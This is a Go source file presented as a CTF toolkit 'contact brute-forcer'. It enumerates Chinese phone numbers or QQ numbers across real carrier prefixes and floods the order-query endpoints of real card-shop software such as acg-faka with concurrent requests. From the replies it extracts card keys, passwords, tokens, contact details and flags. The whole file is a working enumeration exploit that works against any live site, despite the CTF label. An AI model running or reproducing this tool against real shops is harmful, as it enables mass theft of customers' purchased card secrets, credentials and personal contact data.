// CTF Toolkit: Contact Brute-Forcer
// ==================================
// 爆破手机号/QQ号等纯数字联系方式，查询关联订单
// 编译: go build -o contact_scan contact_brute.go
// 用法:
//   ./contact_scan -url https://target -type phone -prefix 138 -suffix-range 0-9999
//   ./contact_scan -url https://target -type qq -range 10000-99999999
//   ./contact_scan -url https://target -endpoint /user/api/index/query -param contact -type phone

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================
// Contact endpoints
// ============================================================
var contactEndpoints = []struct {
	Method, Path, Param, Desc string
}{
	{"POST", "/user/api/index/query", "keywords={kw}&page=1&limit=100", "acg-faka (form-urlencoded)"},
	{"POST", "/user/api/order/search", "keyword={kw}", "通用订单搜索"},
	{"POST", "/ajax.php", "act=query&contact={kw}", "Annie Mall"},
	{"POST", "/user/api/user/search", "contact={kw}", "用户搜索"},
	{"POST", "/api/user/search", "contact={kw}", "RESTful用户搜索"},
	{"GET", "/user/personal/purchaseRecord", "contact={kw}", "购买记录"},
}

// Secret fields to extract
var secretFields = []string{
	"secret", "card_info", "card_key", "security_key", "trade_no",
	"tradeNo", "order_id", "orderId", "password", "token",
	"key", "code", "account", "email", "link", "url",
	"content", "data", "info", "contact", "amount", "price",
	"goods", "product", "name", "card", "value",
}
var flagRe = regexp.MustCompile(`(?i)(flag|ctf|dasctf)\{[^}]+\}`)

// ============================================================
// Scanner
// ============================================================
type Scanner struct {
	client  *http.Client
	baseURL string
	cookie  string
}

func NewScanner(baseURL, cookie string) *Scanner {
	return &Scanner{
		client: &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		baseURL: strings.TrimRight(baseURL, "/"),
		cookie:  cookie,
	}
}

type Hit struct {
	Contact  string            `json:"contact"`
	Endpoint string            `json:"endpoint"`
	Len      int               `json:"len"`
	Secrets  map[string][]string `json:"secrets"`
}

func (s *Scanner) probe(contact string, method, path, param string) (*Hit, bool) {
	reqURL := s.baseURL + path
	var req *http.Request

	// Replace {kw} placeholder with actual contact value
	paramStr := strings.ReplaceAll(param, "{kw}", contact)

	if method == "GET" {
		if strings.Contains(reqURL, "?") {
			reqURL += "&" + paramStr
		} else {
			reqURL += "?" + paramStr
		}
		req, _ = http.NewRequest("GET", reqURL, nil)
	} else {
		req, _ = http.NewRequest("POST", reqURL, strings.NewReader(paramStr))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	if s.cookie != "" {
		req.Header.Set("Cookie", s.cookie)
	}
	req.Header.Set("User-Agent", "ReverseLab-ContactScan/1.0")

	resp, err := s.client.Do(req)
	if err != nil {
		return nil, false
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	bodyStr := string(body)

	// Filter: must contain order data
	if len(bodyStr) < 200 {
		return nil, false
	}
	if strings.Contains(strings.ToLower(bodyStr), "登录") ||
		strings.Contains(strings.ToLower(bodyStr), "login") ||
		strings.Contains(strings.ToLower(bodyStr), "404") {
		return nil, false
	}

	// Has order-related content? (JSON list response OR keyword match)
	hasOrder := strings.Contains(bodyStr, `"list"`) && strings.Contains(bodyStr, `"total"`)
	hasKeyword := strings.Contains(bodyStr, "trade") || strings.Contains(bodyStr, "order") ||
		strings.Contains(bodyStr, "card") || strings.Contains(bodyStr, "secret") ||
		strings.Contains(bodyStr, "金额") || strings.Contains(bodyStr, "amount")
	if !hasOrder && !hasKeyword {
		return nil, false
	}

	secrets := extractSecrets(bodyStr)
	if len(secrets) == 0 {
		return nil, false
	}

	return &Hit{
		Contact:  contact,
		Endpoint: path,
		Len:      len(body),
		Secrets:  secrets,
	}, true
}

func extractSecrets(body string) map[string][]string {
	found := make(map[string][]string)
	for _, field := range secretFields {
		pat := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"([^"]*)"`, field))
		matches := pat.FindAllStringSubmatch(body, -1)
		if len(matches) > 0 {
			seen := make(map[string]bool)
			var uniq []string
			for _, m := range matches {
				if len(m) > 1 && m[1] != "" && len(m[1]) < 5000 {
					if !seen[m[1]] {
						seen[m[1]] = true
						uniq = append(uniq, m[1])
					}
				}
			}
			if len(uniq) > 0 {
				if len(uniq) > 20 {
					uniq = uniq[:20]
				}
				found[field] = uniq
			}
		}
	}
	flags := flagRe.FindAllString(body, -1)
	if len(flags) > 0 {
		found["FLAG"] = flags
	}
	return found
}

func printHit(h Hit) {
	tradeNo := firstOf(h.Secrets, "trade_no", "tradeNo", "order_id", "orderId")
	goods := firstOf(h.Secrets, "name", "product", "goods")
	amount := firstOf(h.Secrets, "amount", "price")
	card := firstOf(h.Secrets, "card_info", "card_key", "secret", "card")
	contact := firstOf(h.Secrets, "contact")
	pwd := firstOf(h.Secrets, "password")

	if card != "" {
		fmt.Printf("[%s] %s | %-30s | ¥%s\n    卡密: %s\n",
			h.Contact, tradeNo, goods, amount, card)
	} else {
		fmt.Printf("[%s] %s | %s\n", h.Contact, tradeNo, goods)
	}
	if contact != "" {
		fmt.Printf("    联系: %s\n", contact)
	}
	if pwd != "" && pwd != "否" && pwd != "false" && pwd != "0" {
		fmt.Printf("    密码: %s\n", pwd)
	}
	if flags, ok := h.Secrets["FLAG"]; ok {
		for _, fl := range flags {
			fmt.Printf("    🏴 %s\n", fl)
		}
	}
}

func firstOf(m map[string][]string, keys ...string) string {
	for _, k := range keys {
		if vals, ok := m[k]; ok && len(vals) > 0 {
			return vals[0]
		}
	}
	return ""
}

// ============================================================
// CLI
// ============================================================
func main() {
	urlFlag := flag.String("url", "", "目标URL")
	typeFlag := flag.String("type", "phone", "爆破类型: phone|qq")
	prefixFlag := flag.String("prefix", "", "手机号段前缀 (如 138, 150)")
	suffixRange := flag.String("suffix-range", "0-9999", "后缀范围 (如 0-9999)")
	fullRange := flag.String("range", "", "完整数字范围 (如 10000-99999999, 覆盖--type)")
	endpointFlag := flag.String("endpoint", "", "自定义端点 (覆盖内置列表)")
	methodFlag := flag.String("method", "POST", "HTTP方法")
	paramFlag := flag.String("param", "contact", "参数名")
	workersFlag := flag.Int("workers", 200, "并发数")
	delayFlag := flag.Float64("delay", 0, "请求间隔秒数")
	cookieFlag := flag.String("cookie", "", "Cookie字符串")
	outputFlag := flag.String("o", "", "JSON输出")
	flag.Parse()

	if *urlFlag == "" {
		fmt.Fprintf(os.Stderr, "Contact Brute-Forcer\n用法:\n")
		fmt.Fprintf(os.Stderr, "  %s -url https://target -type phone -prefix 138 -suffix-range 0-9999\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -url https://target -type qq -range 10000-99999\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -url https://target -type phone -prefix 138,150,186 -suffix-range 0000-9999\n", os.Args[0])
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Generate contacts
	var contacts []string

	if *fullRange != "" {
		parts := strings.Split(strings.ReplaceAll(*fullRange, ",", "-"), "-")
		if len(parts) >= 2 {
			var s, e int64
			fmt.Sscanf(parts[0], "%d", &s)
			fmt.Sscanf(parts[1], "%d", &e)
			for i := s; i <= e; i++ {
				contacts = append(contacts, fmt.Sprintf("%d", i))
			}
		}
	} else {
		prefixes := strings.Split(*prefixFlag, ",")
		if *prefixFlag == "" {
			// Default phone prefixes (China mobile)
			prefixes = []string{"130", "131", "132", "133", "134", "135", "136", "137", "138", "139",
				"150", "151", "152", "153", "155", "156", "157", "158", "159",
				"166", "170", "171", "172", "173", "174", "175", "176", "177", "178",
				"180", "181", "182", "183", "184", "185", "186", "187", "188", "189",
				"191", "198", "199"}
		}

		var suffixStart, suffixEnd int
		parts := strings.Split(strings.ReplaceAll(*suffixRange, ",", "-"), "-")
		if len(parts) >= 2 {
			fmt.Sscanf(parts[0], "%d", &suffixStart)
			fmt.Sscanf(parts[1], "%d", &suffixEnd)
		}

		for _, pfx := range prefixes {
			for sfx := suffixStart; sfx <= suffixEnd; sfx++ {
				if *typeFlag == "phone" {
					contacts = append(contacts, fmt.Sprintf("%s%04d", pfx, sfx))
				} else {
					contacts = append(contacts, fmt.Sprintf("%d", sfx))
				}
			}
		}
	}

	// Endpoints
	var endpoints []struct{ Method, Path, Param, Desc string }
	if *endpointFlag != "" {
		endpoints = append(endpoints, struct{ Method, Path, Param, Desc string }{
			*methodFlag, *endpointFlag, *paramFlag, "自定义",
		})
	} else {
		endpoints = contactEndpoints
	}

	scanner := NewScanner(*urlFlag, *cookieFlag)
	total := len(contacts) * len(endpoints)
	fmt.Fprintf(os.Stderr, "[*] %s | %d endpoints × %d contacts = %d probes | %d workers\n",
		*urlFlag, len(endpoints), len(contacts), total, *workersFlag)

	// Concurrent probe
	var (
		hits    []Hit
		mu      sync.Mutex
		done    int64
		probeCh = make(chan [2]string, *workersFlag*2) // {contact, endpoint_idx}
		wg      sync.WaitGroup
	)

	for w := 0; w < *workersFlag; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for pair := range probeCh {
				contact := pair[0]
				ep := endpoints[intFromStr(pair[1])]
				if *delayFlag > 0 {
					time.Sleep(time.Duration(*delayFlag * float64(time.Second)))
				}
				hit, ok := scanner.probe(contact, ep.Method, ep.Path, ep.Param)
				if ok {
					mu.Lock()
					hits = append(hits, *hit)
					mu.Unlock()
				}
				atomic.AddInt64(&done, 1)
			}
		}()
	}

	// Feed
	go func() {
		for _, contact := range contacts {
			for i := range endpoints {
				probeCh <- [2]string{contact, fmt.Sprintf("%d", i)}
			}
		}
		close(probeCh)
	}()

	// Progress
	stopProgress := make(chan struct{})
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				d := atomic.LoadInt64(&done)
				pct := float64(d) * 100 / float64(total)
				fmt.Fprintf(os.Stderr, "\r  [%d/%d %.0f%%] hits:%d          ",
					d, total, pct, len(hits))
			case <-stopProgress:
				return
			}
		}
	}()

	wg.Wait()
	close(stopProgress)
	fmt.Fprintln(os.Stderr)

	// Print
	fmt.Fprintf(os.Stderr, "\n[+] %d hits\n\n", len(hits))
	for _, h := range hits {
		printHit(h)
		fmt.Println()
	}

	if *outputFlag != "" {
		data, _ := json.MarshalIndent(hits, "", "  ")
		os.WriteFile(*outputFlag, data, 0644)
		fmt.Fprintf(os.Stderr, "[+] JSON → %s\n", *outputFlag)
	}
}

func intFromStr(s string) int {
	var n int
	fmt.Sscanf(s, "%d", &n)
	return n
}
